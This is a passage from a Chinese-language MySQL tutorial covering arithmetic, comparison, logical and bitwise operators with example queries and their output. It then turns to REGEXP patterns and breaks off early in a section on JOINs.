id="MySQL-运算符"><a href="#MySQL-运算符" class="headerlink" title="MySQL 运算符"></a>MySQL 运算符</h1><ul><li>算术运算符</li><li>比较运算符</li><li>逻辑运算符</li><li>位运算符</li></ul><hr><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>MySQL 支持的算术运算符包括:</p><table><thead><tr><th align="left">运算符</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">+</td><td align="left">加法</td></tr><tr><td align="left">-</td><td align="left">减法</td></tr><tr><td align="left">*</td><td align="left">乘法</td></tr><tr><td align="left">/ 或 DIV</td><td align="left">除法</td></tr><tr><td align="left">% 或 MOD</td><td align="left">取余</td></tr></tbody></table><p>在除法运算和模运算中，如果除数为0，将是非法除数，返回结果为NULL。</p><p>1、加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1+2;</span><br><span class="line">+-----+</span><br><span class="line">| 1+2 |</span><br><span class="line">+-----+</span><br><span class="line">|   3 |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p>2、减</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1-2;</span><br><span class="line">+-----+</span><br><span class="line">| 1-2 |</span><br><span class="line">+-----+</span><br><span class="line">|  -1 |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p>3、乘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2*3;</span><br><span class="line">+-----+</span><br><span class="line">| 2*3 |</span><br><span class="line">+-----+</span><br><span class="line">|   6 |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p>4、除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2/3;</span><br><span class="line">+--------+</span><br><span class="line">| 2/3    |</span><br><span class="line">+--------+</span><br><span class="line">| 0.6667 |</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure><p>5、商</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 10 DIV 4;</span><br><span class="line">+----------+</span><br><span class="line">| 10 DIV 4 |</span><br><span class="line">+----------+</span><br><span class="line">|        2 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p>6、取余</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 10 MOD 4;</span><br><span class="line">+----------+</span><br><span class="line">| 10 MOD 4 |</span><br><span class="line">+----------+</span><br><span class="line">|        2 |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><hr><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>SELECT 语句中的条件语句经常要使用比较运算符。通过这些比较运算符，可以判断表中的哪些记录是符合条件的。比较结果为真，则返回 1，为假则返回 0，比较结果不确定则返回 NULL。</p><table><thead><tr><th align="left">符号</th><th align="left">描述</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">=</td><td align="left">等于</td><td align="left"></td></tr><tr><td align="left">&lt;&gt;, !=</td><td align="left">不等于</td><td align="left"></td></tr><tr><td align="left">&gt;</td><td align="left">大于</td><td align="left"></td></tr><tr><td align="left">&lt;</td><td align="left">小于</td><td align="left"></td></tr><tr><td align="left">&lt;=</td><td align="left">小于等于</td><td align="left"></td></tr><tr><td align="left">&gt;=</td><td align="left">大于等于</td><td align="left"></td></tr><tr><td align="left">BETWEEN</td><td align="left">在两值之间</td><td align="left">&gt;=min&amp;&amp;&lt;=max</td></tr><tr><td align="left">NOT BETWEEN</td><td align="left">不在两值之间</td><td align="left"></td></tr><tr><td align="left">IN</td><td align="left">在集合中</td><td align="left"></td></tr><tr><td align="left">NOT IN</td><td align="left">不在集合中</td><td align="left"></td></tr><tr><td align="left">&lt;=&gt;</td><td align="left">严格比较两个NULL值是否相等</td><td align="left">两个操作码均为NULL时，其所得值为1；而当一个操作码为NULL时，其所得值为0</td></tr><tr><td align="left">LIKE</td><td align="left">模糊匹配</td><td align="left"></td></tr><tr><td align="left">REGEXP 或 RLIKE</td><td align="left">正则式匹配</td><td align="left"></td></tr><tr><td align="left">IS NULL</td><td align="left">为空</td><td align="left"></td></tr><tr><td align="left">IS NOT NULL</td><td align="left">不为空</td><td align="left"></td></tr></tbody></table><p>1、等于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2=3;</span><br><span class="line">+-----+</span><br><span class="line">| 2=3 |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select NULL = NULL;</span><br><span class="line">+-------------+</span><br><span class="line">| NULL = NULL |</span><br><span class="line">+-------------+</span><br><span class="line">|        NULL |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p>2、不等于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2&lt;&gt;3;</span><br><span class="line">+------+</span><br><span class="line">| 2&lt;&gt;3 |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><p>3、安全等于</p><p>与 <strong>=</strong> 的区别在于当两个操作码均为 NULL 时，其所得值为 1 而不为 NULL，而当一个操作码为 NULL 时，其所得值为 0而不为 NULL。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2&lt;=&gt;3;</span><br><span class="line">+-------+</span><br><span class="line">| 2&lt;=&gt;3 |</span><br><span class="line">+-------+</span><br><span class="line">|     0 |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select null=null;</span><br><span class="line">+-----------+</span><br><span class="line">| null=null |</span><br><span class="line">+-----------+</span><br><span class="line">|      NULL |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">mysql&gt; select null&lt;=&gt;null;</span><br><span class="line">+-------------+</span><br><span class="line">| null&lt;=&gt;null |</span><br><span class="line">+-------------+</span><br><span class="line">|           1 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p>4、小于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2&lt;3;</span><br><span class="line">+-----+</span><br><span class="line">| 2&lt;3 |</span><br><span class="line">+-----+</span><br><span class="line">|   1 |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p>5、小于等于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2&lt;=3;</span><br><span class="line">+------+</span><br><span class="line">| 2&lt;=3 |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><p>6、大于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2&gt;3;</span><br><span class="line">+-----+</span><br><span class="line">| 2&gt;3 |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p>7、大于等于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2&gt;=3;</span><br><span class="line">+------+</span><br><span class="line">| 2&gt;=3 |</span><br><span class="line">+------+</span><br><span class="line">|    0 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><p>8、BETWEEN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 5 between 1 and 10;</span><br><span class="line">+--------------------+</span><br><span class="line">| 5 between 1 and 10 |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  1 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p>9、IN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 5 in (1,2,3,4,5);</span><br><span class="line">+------------------+</span><br><span class="line">| 5 in (1,2,3,4,5) |</span><br><span class="line">+------------------+</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p>10、NOT IN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 5 not in (1,2,3,4,5);</span><br><span class="line">+----------------------+</span><br><span class="line">| 5 not in (1,2,3,4,5) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    0 |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p>11、IS NULL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select null is NULL;</span><br><span class="line">+--------------+</span><br><span class="line">| null is NULL |</span><br><span class="line">+--------------+</span><br><span class="line">|            1 |</span><br><span class="line">+--------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#x27;a&#x27; is NULL;</span><br><span class="line">+-------------+</span><br><span class="line">| &#x27;a&#x27; is NULL |</span><br><span class="line">+-------------+</span><br><span class="line">|           0 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p>12、IS NOT NULL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select null IS NOT NULL;</span><br><span class="line">+------------------+</span><br><span class="line">| null IS NOT NULL |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">+------------------+</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">mysql&gt; select &#x27;a&#x27; IS NOT NULL;</span><br><span class="line">+-----------------+</span><br><span class="line">| &#x27;a&#x27; IS NOT NULL |</span><br><span class="line">+-----------------+</span><br><span class="line">|               1 |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p>13、LIKE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &#x27;12345&#x27; like &#x27;12%&#x27;;</span><br><span class="line">+--------------------+</span><br><span class="line">| &#x27;12345&#x27; like &#x27;12%&#x27; |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  1 |</span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#x27;12345&#x27; like &#x27;12_&#x27;;</span><br><span class="line">+--------------------+</span><br><span class="line">| &#x27;12345&#x27; like &#x27;12_&#x27; |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  0 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p>14、REGEXP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &#x27;beijing&#x27; REGEXP &#x27;jing&#x27;;</span><br><span class="line">+-------------------------+</span><br><span class="line">| &#x27;beijing&#x27; REGEXP &#x27;jing&#x27; |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       1 |</span><br><span class="line">+-------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#x27;beijing&#x27; REGEXP &#x27;xi&#x27;;</span><br><span class="line">+-----------------------+</span><br><span class="line">| &#x27;beijing&#x27; REGEXP &#x27;xi&#x27; |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     0 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><hr><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。</p><table><thead><tr><th align="left">运算符号</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">NOT 或 !</td><td align="left">逻辑非</td></tr><tr><td align="left">AND</td><td align="left">逻辑与</td></tr><tr><td align="left">OR</td><td align="left">逻辑或</td></tr><tr><td align="left">XOR</td><td align="left">逻辑异或</td></tr></tbody></table><p>1、与</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2 and 0;</span><br><span class="line">+---------+</span><br><span class="line">| 2 and 0 |</span><br><span class="line">+---------+</span><br><span class="line">|       0 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">mysql&gt; select 2 and 1;   </span><br><span class="line">+---------+     </span><br><span class="line">| 2 and 1 |      </span><br><span class="line">+---------+      </span><br><span class="line">|       1 |      </span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p>2、或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 2 or 0;</span><br><span class="line">+--------+</span><br><span class="line">| 2 or 0 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 2 or 1;</span><br><span class="line">+--------+</span><br><span class="line">| 2 or 1 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 0 or 0;</span><br><span class="line">+--------+</span><br><span class="line">| 0 or 0 |</span><br><span class="line">+--------+</span><br><span class="line">|      0 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 || 0;</span><br><span class="line">+--------+</span><br><span class="line">| 1 || 0 |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure><p>3、非</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select not 1;</span><br><span class="line">+-------+</span><br><span class="line">| not 1 |</span><br><span class="line">+-------+</span><br><span class="line">|     0 |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select !0;</span><br><span class="line">+----+</span><br><span class="line">| !0 |</span><br><span class="line">+----+</span><br><span class="line">|  1 |</span><br><span class="line">+----+</span><br></pre></td></tr></table></figure><p>4、异或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 xor 1;</span><br><span class="line">+---------+</span><br><span class="line">| 1 xor 1 |</span><br><span class="line">+---------+</span><br><span class="line">|       0 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 0 xor 0;</span><br><span class="line">+---------+</span><br><span class="line">| 0 xor 0 |</span><br><span class="line">+---------+</span><br><span class="line">|       0 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 xor 0;</span><br><span class="line">+---------+</span><br><span class="line">| 1 xor 0 |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select null or 1;</span><br><span class="line">+-----------+</span><br><span class="line">| null or 1 |</span><br><span class="line">+-----------+</span><br><span class="line">|         1 |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 ^ 0;</span><br><span class="line">+-------+</span><br><span class="line">| 1 ^ 0 |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br></pre></td></tr></table></figure><hr><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><p>位运算符是在二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。</p><table><thead><tr><th align="left">运算符号</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">&amp;</td><td align="left">按位与</td></tr><tr><td align="left">|</td><td align="left">按位或</td></tr><tr><td align="left">^</td><td align="left">按位异或</td></tr><tr><td align="left">!</td><td align="left">取反</td></tr><tr><td align="left">&lt;&lt;</td><td align="left">左移</td></tr><tr><td align="left">&gt;&gt;</td><td align="left">右移</td></tr></tbody></table><p>1、按位与</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 3&amp;5;</span><br><span class="line">+-----+</span><br><span class="line">| 3&amp;5 |</span><br><span class="line">+-----+</span><br><span class="line">|   1 |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p>2、按位或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 3|5;</span><br><span class="line">+-----+</span><br><span class="line">| 3|5 |</span><br><span class="line">+-----+</span><br><span class="line">|   7 |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p>3、按位异或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 3^5;</span><br><span class="line">+-----+</span><br><span class="line">| 3^5 |</span><br><span class="line">+-----+</span><br><span class="line">|   6 |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p>4、按位取反</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~18446744073709551612;</span><br><span class="line">+-----------------------+</span><br><span class="line">| ~18446744073709551612 |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     3 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p>5、按位右移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 3&gt;&gt;1;</span><br><span class="line">+------+</span><br><span class="line">| 3&gt;&gt;1 |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><p>6、按位左移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 3&lt;&lt;1;</span><br><span class="line">+------+</span><br><span class="line">| 3&lt;&lt;1 |</span><br><span class="line">+------+</span><br><span class="line">|    6 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><hr><h2 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h2><p>最低优先级为： **:=**。</p><p><img src="%7Bfilename%7D/1011652-20170416163043227-1936139924.png" alt="img"></p><p>最高优先级为： <strong>!<strong>、</strong>BINARY</strong>、 <strong>COLLATE</strong>。</p><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><h1 id="MySQL-正则表达式"><a href="#MySQL-正则表达式" class="headerlink" title="MySQL 正则表达式"></a>MySQL 正则表达式</h1><p>在前面的章节我们已经了解到MySQL可以通过 <strong>LIKE …%</strong> 来进行模糊匹配。</p><p>MySQL 同样也支持其他正则表达式的匹配， MySQL中使用 REGEXP 操作符来进行正则表达式匹配。</p><p>如果您了解PHP或Perl，那么操作起来就非常简单，因为MySQL的正则表达式匹配与这些脚本的类似。</p><p>下表中的正则模式可应用于 REGEXP 操作符中。</p><table><thead><tr><th align="left">模式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">^</td><td align="left">匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。</td></tr><tr><td align="left">$</td><td align="left">匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。</td></tr><tr><td align="left">.</td><td align="left">匹配除 “\n” 之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用像 ‘[.\n]’ 的模式。</td></tr><tr><td align="left">[…]</td><td align="left">字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。</td></tr><tr><td align="left">[^…]</td><td align="left">负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p’。</td></tr><tr><td align="left">p1|p2|p3</td><td align="left">匹配 p1 或 p2 或 p3。例如，’z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。</td></tr><tr><td align="left">*</td><td align="left">匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td></tr><tr><td align="left">+</td><td align="left">匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td></tr><tr><td align="left">{n}</td><td align="left">n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td></tr><tr><td align="left">{n,m}</td><td align="left">m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。</td></tr></tbody></table><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>了解以上的正则需求后，我们就可以根据自己的需求来编写带有正则表达式的SQL语句。以下我们将列出几个小实例(表名：person_tbl )来加深我们的理解：</p><p>查找name字段中以’st’为开头的所有数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP &#x27;^st&#x27;;</span><br></pre></td></tr></table></figure><p>查找name字段中以’ok’为结尾的所有数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP &#x27;ok$&#x27;;</span><br></pre></td></tr></table></figure><p>查找name字段中包含’mar’字符串的所有数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP &#x27;mar&#x27;;</span><br></pre></td></tr></table></figure><p>查找name字段中以元音字符开头或以’ok’字符串结尾的所有数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP &#x27;^[aeiou]|ok$&#x27;;</span><br></pre></td></tr></table></figure><h3 id="连接-1"><a href="#连接-1" class="headerlink" title="连接"></a>连接</h3><p>MySQL 连接的使用</p><p>使用 MySQL 的 JOIN 在两个或多个表中查询数据。</p><p>你可以在 SELECT, UPDATE 和 DELETE 语句中使用 Mysql 的 JOIN 来联合多表查询。</p><p>JOIN 按照功能大致分为如下三类：</p><ul><li><strong>INNER JOIN（内连接,或等值连接）</strong>：获取两个表中字段匹配关系的记录。</li><li><strong>LEFT JOIN（左连接）：</strong>获取左表所有记录，即使右表没有对应匹配的记录。</li><li><strong>RIGHT JOIN（右连接）：</strong> 与 LEFT JOIN 相反，用于获取右表所有记录，即使左表没有对应匹配的记录。</li></ul><p>本章节使用的数据库结构及数据下载：<a href="https://static.runoob.com/download/runoob-mysql-join-test.sql">runoob-mysql-join-test.sql</a>。</p><p>在命令提示符中使用 INNER JOIN</p><p>我们在RUNOOB数据库中有两张表 tcount_tbl 和 